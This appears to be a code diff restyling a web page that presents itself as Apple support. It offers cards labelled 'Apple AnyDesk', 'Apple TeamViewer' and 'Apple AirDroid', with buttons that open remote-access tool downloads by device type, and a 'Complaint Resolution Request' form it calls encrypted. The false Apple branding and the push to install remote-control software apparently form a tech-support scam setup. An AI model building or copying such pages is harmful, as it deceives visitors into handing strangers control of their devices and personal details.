@@ -616,27 +616,51 @@ background:#0071e3;
 
 .support-icon{
 
-width:64px;
-height:64px;
+width:72px;
+height:72px;
 
-background:#f2f2f7;
-
-border-radius:16px;
+margin:0 auto 22px;
 
 display:flex;
-
 align-items:center;
-
 justify-content:center;
 
-margin:0 auto 18px;
+border-radius:22px;
+
+background:
+linear-gradient(
+145deg,
+rgba(255,255,255,.95),
+rgba(245,245,247,.75)
+);
+
+backdrop-filter:blur(18px);
+
+-webkit-backdrop-filter:blur(18px);
+
+border:1px solid rgba(255,255,255,.7);
+
+box-shadow:
+0 8px 20px rgba(0,0,0,.08),
+inset 0 1px 0 rgba(255,255,255,.9);
+
+transition:.35s;
+}
+
+.support-card:hover .support-icon{
+
+transform:translateY(-4px) scale(1.08);
+
+box-shadow:
+0 14px 28px rgba(0,0,0,.12),
+0 0 18px rgba(0,113,227,.15);
 
 }
 
 .support-icon svg{
 
-width:30px;
-height:30px;
+width:60px;
+height:60px;
 
 color:#6E6E73;
 
@@ -666,19 +690,67 @@ margin-bottom:24px;
 
 .support-action{
 
+margin-top:auto;
+
 display:flex;
 
-justify-content:space-between;
-
-align-items:center;
+justify-content:center;
 
 }
 
 .support-action span{
 
-color:#0071e3;
+display:flex;
+
+align-items:center;
+
+justify-content:center;
+
+gap:10px;
+
+width:100%;
+
+padding:14px 18px;
+
+border-radius:14px;
+
+background:linear-gradient(
+180deg,
+#007AFF,
+#0063CC
+);
+
+color:#fff;
+
+font-size:15px;
 
 font-weight:600;
+
+letter-spacing:.2px;
+
+box-shadow:
+0 8px 18px rgba(0,122,255,.22);
+
+transition:.3s ease;
+
+cursor:pointer;
+
+user-select:none;
+
+}
+
+.support-card:hover .support-action span{
+
+transform:translateY(-2px);
+
+box-shadow:
+0 14px 28px rgba(0,122,255,.30);
+
+background:linear-gradient(
+180deg,
+#1A8CFF,
+#0069D9
+);
 
 }
 
@@ -1136,6 +1208,28 @@ max-width:1200px;
 
 margin:auto;
 
+padding:30px;
+
+border-radius:36px;
+
+background:linear-gradient(
+145deg,
+rgba(255,255,255,.92),
+rgba(248,248,250,.82)
+);
+
+backdrop-filter:blur(22px);
+
+-webkit-backdrop-filter:blur(22px);
+
+border:1px solid rgba(255,255,255,.75);
+
+box-shadow:
+0 25px 60px rgba(0,0,0,.08),
+inset 0 1px 0 rgba(255,255,255,.9);
+
+overflow:hidden;
+
 }
 
 .google-form-frame{
@@ -1146,11 +1240,75 @@ height:1400px;
 
 border:none;
 
-border-radius:30px;
+border-radius:24px;
 
 background:white;
 
+box-shadow:
+0 10px 35px rgba(0,0,0,.08);
+
 }
+
+.form-header{
+
+text-align:center;
+
+margin-bottom:30px;
+
+}
+
+.form-badge{
+
+display:inline-flex;
+
+align-items:center;
+
+gap:8px;
+
+padding:10px 18px;
+
+border-radius:999px;
+
+background:rgba(0,122,255,.08);
+
+color:#007AFF;
+
+font-size:14px;
+
+font-weight:600;
+
+margin-bottom:20px;
+
+}
+
+.form-header h3{
+
+font-size:34px;
+
+font-weight:700;
+
+letter-spacing:-1px;
+
+margin-bottom:12px;
+
+color:#1d1d1f;
+
+}
+
+.form-header p{
+
+max-width:650px;
+
+margin:auto;
+
+font-size:17px;
+
+line-height:1.7;
+
+color:#6e6e73;
+
+}
+
 
 /* MOBILE */
 
@@ -1258,13 +1416,34 @@ padding:22px;
 height:1700px;
 }
 
+.form-wrapper{
+
+padding:18px;
+
+border-radius:24px;
+
+}
+
+.form-header h3{
+
+font-size:28px;
+
+}
+
+.form-header p{
+
+font-size:15px;
+
+}
+
+
 .support-card{
 
-padding:24px;
+background:white;
 
-border-radius:22px;
+border-radius:30px;
 
-height:100%;
+padding:34px;
 
 display:flex;
 
@@ -1273,17 +1452,18 @@ flex-direction:column;
 justify-content:flex-start;
 
 box-shadow:
-0 4px 16px rgba(0,0,0,.06);
+0 8px 30px rgba(0,0,0,.08);
 
-}
+border:
+1px solid rgba(0,0,0,.05);
 
-.support-card h3{
+transition:.35s;
 
-font-size:20px;
+position:relative;
 
-line-height:1.2;
+overflow:hidden;
 
-margin-bottom:10px;
+height:100%;
 
 }
 
@@ -1879,29 +2059,27 @@ id="apple-anydesk">
 
 <div class="support-icon">
 
-<svg viewBox="0 0 24 24">
+<svg viewBox="0 0 64 64" width="34" height="34">
 
-<rect
-x="3"
-y="4"
-width="18"
-height="13"
+<rect x="17" y="17"
+width="14"
+height="14"
 rx="2"
-fill="none"
-stroke="currentColor"
-stroke-width="1.8"/>
+transform="rotate(45 24 24)"
+fill="#E53935"/>
+
+<rect x="33" y="33"
+width="14"
+height="14"
+rx="2"
+transform="rotate(45 40 40)"
+fill="#E53935"/>
 
 <path
-d="M10 8L7 11L10 14L13 11Z"/>
-
-<path
-d="M14 8L11 11L14 14L17 11Z"/>
-
-<rect
-x="10"
-y="18"
-width="4"
-height="2"/>
+d="M28 28L36 36"
+stroke="#fff"
+stroke-width="2.5"
+stroke-linecap="round"/>
 
 </svg>
 
@@ -1922,7 +2100,28 @@ for Windows, macOS, iPhone, iPad, or Android.
 <div class="support-action">
 
 <span>
-Launch Support →
+
+Launch Support
+
+<svg width="18" height="18" viewBox="0 0 24 24">
+
+<path
+d="M8 12H18"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"/>
+
+<path
+d="M14 8L18 12L14 16"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"
+stroke-linejoin="round"/>
+
+</svg>
+
 </span>
 
 </div>
@@ -1937,14 +2136,19 @@ id="apple-alpemix">
 
 <div class="support-icon">
 
-<svg viewBox="0 0 24 24">
+<svg viewBox="0 0 64 64" width="34" height="34">
 
-<path
-d="M12 3L20 21H16L14.5 17H9.5L8 21H4L12 3Z"/>
+<polygon
+points="32,12 50,22 32,32 14,22"
+fill="#7C4DFF"/>
 
-<path
-d="M10.8 13H13.2L12 9Z"
-fill="#f5f5f7"/>
+<polygon
+points="32,24 50,34 32,44 14,34"
+fill="#9575FF"/>
+
+<polygon
+points="32,36 50,46 32,56 14,46"
+fill="#B39DDB"/>
 
 </svg>
 
@@ -1964,7 +2168,28 @@ secure troubleshooting and specialist guidance.
 <div class="support-action">
 
 <span>
-Launch Support →
+
+Launch Support
+
+<svg width="18" height="18" viewBox="0 0 24 24">
+
+<path
+d="M8 12H18"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"/>
+
+<path
+d="M14 8L18 12L14 16"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"
+stroke-linejoin="round"/>
+
+</svg>
+
 </span>
 
 </div>
@@ -1979,18 +2204,28 @@ id="apple-teamviewer">
 
 <div class="support-icon">
 
-<svg viewBox="0 0 24 24">
+<svg viewBox="0 0 64 64" width="34" height="34">
 
 <circle
-cx="12"
-cy="12"
-r="9"
-fill="none"
-stroke="currentColor"
-stroke-width="1.8"/>
+cx="32"
+cy="32"
+r="24"
+fill="#0A84FF"/>
 
-<path
-d="M8 12L11 9V11H13V9L16 12L13 15V13H11V15Z"/>
+<polygon
+points="20,32 28,25 28,39"
+fill="white"/>
+
+<polygon
+points="44,32 36,25 36,39"
+fill="white"/>
+
+<rect
+x="28"
+y="30"
+width="8"
+height="4"
+fill="white"/>
 
 </svg>
 
@@ -2010,58 +2245,112 @@ Apple TeamViewer support services.
 <div class="support-action">
 
 <span>
-Launch Support →
+
+Launch Support
+
+<svg width="18" height="18" viewBox="0 0 24 24">
+
+<path
+d="M8 12H18"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"/>
+
+<path
+d="M14 8L18 12L14 16"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"
+stroke-linejoin="round"/>
+
+</svg>
+
 </span>
 
 </div>
 
 </div>
 
-<!-- QUICK ASSIST -->
+<!-- AIR DROID -->
 
 <div
 class="support-card fade-up"
-id="apple-quickassist">
+id="apple-airdroid"">
 
 <div class="support-icon">
 
-<svg viewBox="0 0 24 24">
-
-<rect
-x="4"
-y="4"
-width="16"
-height="16"
-rx="2"
-fill="none"
-stroke="currentColor"
-stroke-width="1.8"/>
+<svg viewBox="0 0 64 64" width="34" height="34">
 
 <path
-d="M12 8V16"/>
+d="M32 8
+L50 16
+V28
+C50 42
+42 52
+32 56
+C22 52
+14 42
+14 28
+V16
+Z"
+fill="#2196F3"/>
 
 <path
-d="M8 12H16"/>
+d="M24 32
+H40"
+stroke="white"
+stroke-width="3"
+stroke-linecap="round"/>
+
+<path
+d="M32 24
+V40"
+stroke="white"
+stroke-width="3"
+stroke-linecap="round"/>
 
 </svg>
 
 </div>
 
 <h3>
-Apple Quick Assist
+Apple AirDroid
 </h3>
 
 <p>
 
-Launch Microsoft's Quick Assist application
-for secure support sessions on Windows devices.
+Launch AirDroid Remote Support for Windows,
+macOS, Android phones, iPhone, iPad and tablets.
 
 </p>
 
 <div class="support-action">
 
 <span>
-Launch Support →
+
+Launch Support
+
+<svg width="18" height="18" viewBox="0 0 24 24">
+
+<path
+d="M8 12H18"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"/>
+
+<path
+d="M14 8L18 12L14 16"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"
+stroke-linejoin="round"/>
+
+</svg>
+
 </span>
 
 </div>
@@ -2076,23 +2365,38 @@ id="apple-secure-connect">
 
 <div class="support-icon">
 
-<svg viewBox="0 0 24 24">
+<svg viewBox="0 0 64 64" width="34" height="34">
 
 <path
-d="M12 2L19 6V11C19 16 15.8 20.2 12 21C8.2 20.2 5 16 5 11V6Z"
-fill="none"
-stroke="currentColor"
-stroke-width="1.8"/>
+d="M32 8
+L52 18
+V30
+C52 44
+43 54
+32 58
+C21 54
+12 44
+12 30
+V18
+Z"
+fill="#34C759"/>
 
 <rect
-x="9"
-y="10"
-width="6"
-height="5"
-rx="1"/>
+x="24"
+y="28"
+width="16"
+height="14"
+rx="3"
+fill="white"/>
 
 <path
-d="M10 10V8.5A2 2 0 0114 8.5V10"/>
+d="M27 28
+V24
+a5 5 0 0 1 10 0
+v4"
+fill="none"
+stroke="#34C759"
+stroke-width="2.5"/>
 
 </svg>
 
@@ -2112,7 +2416,28 @@ specialist through a dedicated support session.
 <div class="support-action">
 
 <span>
-Connect Now →
+
+Launch Support
+
+<svg width="18" height="18" viewBox="0 0 24 24">
+
+<path
+d="M8 12H18"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"/>
+
+<path
+d="M14 8L18 12L14 16"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"
+stroke-linejoin="round"/>
+
+</svg>
+
 </span>
 
 </div>
@@ -2127,28 +2452,37 @@ id="apple-connectwise">
 
 <div class="support-icon">
 
-<svg viewBox="0 0 24 24">
+<svg viewBox="0 0 64 64" width="34" height="34">
 
-<path
-d="M4 15C6 11 10 9 14 9C17 9 20 10.5 22 13"
+<circle cx="18" cy="18" r="5" fill="#6C5CE7"/>
 
-fill="none"
-stroke="currentColor"
-stroke-width="1.8"
-stroke-linecap="round"/>
+<circle cx="46" cy="18" r="5" fill="#6C5CE7"/>
 
-<path
-d="M6 18C8 14 11 12 14 12C16.5 12 18.8 13 20 15"
+<circle cx="32" cy="46" r="6" fill="#6C5CE7"/>
 
-fill="none"
-stroke="currentColor"
-stroke-width="1.8"
-stroke-linecap="round"/>
+<line
+x1="18"
+y1="18"
+x2="46"
+y2="18"
+stroke="#6C5CE7"
+stroke-width="3"/>
 
-<circle
-cx="5"
-cy="18"
-r="1.6"/>
+<line
+x1="18"
+y1="18"
+x2="32"
+y2="46"
+stroke="#6C5CE7"
+stroke-width="3"/>
+
+<line
+x1="46"
+y1="18"
+x2="32"
+y2="46"
+stroke="#6C5CE7"
+stroke-width="3"/>
 
 </svg>
 
@@ -2169,7 +2503,28 @@ remote assistance sessions.
 <div class="support-action">
 
 <span>
-Open Platform →
+
+Launch Support
+
+<svg width="18" height="18" viewBox="0 0 24 24">
+
+<path
+d="M8 12H18"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"/>
+
+<path
+d="M14 8L18 12L14 16"
+
+stroke="white"
+stroke-width="2.2"
+stroke-linecap="round"
+stroke-linejoin="round"/>
+
+</svg>
+
 </span>
 
 </div>
@@ -2264,22 +2619,30 @@ GOOGLE FORM
 id="complaint-form"
 class="section">
 
-<div class="section-title">
+<div class="form-wrapper">
 
-<h2>
-Submit Your Request
-</h2>
+<div class="form-header">
+
+<div class="form-badge">
+
+🔒 Secure Support Form
+
+</div>
+
+<h3>
+
+Complaint Resolution Request
+
+</h3>
 
 <p>
 
-Complete the form below and our review team
-will process your request.
+Complete the secure form below.
+Your submission is encrypted and reviewed by our support team.
 
 </p>
 
 </div>
-
-<div class="form-wrapper">
 
 <iframe
 class="google-form-frame"
@@ -2694,19 +3057,62 @@ window.open(
 }
 );
 
-/* QUICK ASSIST */
+/* AIRDROID */
 
 document
-.getElementById("apple-quickassist")
+.getElementById("apple-airdroid")
 .addEventListener(
 "click",
 function(){
 
-window.location.href=
-"ms-quick-assist:";
+const ua = navigator.userAgent;
+
+if (/Android/i.test(ua)) {
+
+window.open(
+"https://play.google.com/store/apps/details?id=com.sand.airsos",
+"_blank"
+);
 
 }
+
+else if (/iPhone|iPad|iPod/i.test(ua)) {
+
+window.open(
+"https://apps.apple.com/us/app/airdroid-remote-support/id1502345783",
+"_blank"
 );
+
+}
+
+else if (/Mac/i.test(ua)) {
+
+window.open(
+"https://www.airdroid.com/download/remote-support/",
+"_blank"
+);
+
+}
+
+else if (/Win/i.test(ua)) {
+
+window.open(
+"https://www.airdroid.com/download/remote-support/",
+"_blank"
+);
+
+}
+
+else{
+
+window.open(
+"https://www.airdroid.com/download/remote-support/",
+"_blank"
+);
+
+}
+
+});
 
 /* SECURE CONNECT */
 
